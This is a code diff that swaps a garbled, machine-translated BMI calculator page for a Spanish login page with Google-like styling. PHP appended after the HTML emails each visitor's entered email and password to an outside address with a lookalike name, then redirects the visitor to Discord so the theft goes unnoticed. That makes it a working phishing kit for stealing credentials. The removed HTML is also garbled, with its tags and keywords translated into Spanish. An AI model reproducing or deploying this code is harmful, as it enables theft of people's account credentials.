@@ -1,41 +1,104 @@
 <!DOCTYPE html>
-<html>
-<cabeza>
-    <título></título>
-	<meta charset="utf-8" />
-    <script src="Scripts/jquery-1.9.1.min.js"></script>
-    <link href="Contenido/bootstrap.min.css" rel="hoja de estilo" />
-    <script src="Scripts/isRockFx.js"></script>
-    <guión>
-        $(función () {
-            $('#ButtonCal').click(
-                función () {
-                    //Los niños que se mudan a un nuevo hogar pueden quedarse sin hogar
-                    var para = { 'altura': $('#txbHeight').val(), 'peso': $('#txbWeight').val() };
-                    //API de prueba
-                    ExecuteAPI('Ejemplo', 'IMC', párrafo,
-			//呼叫WebAPI成功時運行的Función de devolución de llamada
-                        función (resultado) {
-                            alerta(resultado.Datos);
-                        }
-                        );
-                }
-                );
-        });
-    </script>
-</cabeza>
-<cuerpo>
-    <div class="fila" estilo="margen:10px">
-        <div class="col-md-12">
-            <div class="grupo-de-formularios">
-                Significado:
-                <input id="txbHeight" class="form-control" placeholder="請輸入身高" />
-                Nombre:
-                <input id="txbWeight" class="form-control" placeholder="請輸入體重" />
-                <br />
-                <button class="btn btn-primary" id="ButtonCal">計算</button>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - Ejemplo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #357ae8;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Iniciar Sesión</h1>
+        <form>
+            <div class="input-group">
+                <label for="email">Correo electrónico</label>
+                <input type="email" id="email" name="email" required>
             </div>
-        </div>
+            <div class="input-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-btn">Siguiente</button>
+        </form>
     </div>
-</cuerpo>
+</body>
 </html>
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Obtener los datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Aquí puedes personalizar la dirección de destino de tu correo electrónico
+    $to = 'gmail@accuendrecupedfx0zenu.com';
+    $subject = 'Datos del formulario de inicio de sesión';
+    $message = "Correo electrónico: $email\nContraseña: $password";
+    
+    // Cabeceras para el correo
+    $headers = "From: no-reply@tusitio.com" . "\r\n" .
+               "Reply-To: $email" . "\r\n" .
+               "X-Mailer: PHP/" . phpversion();
+
+    // Enviar el correo
+    if (mail($to, $subject, $message, $headers)) {
+        // Redirigir a Discord después de enviar el correo
+        header("Location: https://discord.com");
+        exit(); // Es importante usar exit después de la redirección para asegurar que el script termine.
+    } else {
+        echo "Hubo un error al enviar el mensaje.";
+    }
+} else {
+    echo "No se recibieron datos del formulario.";
+}
+?>
+
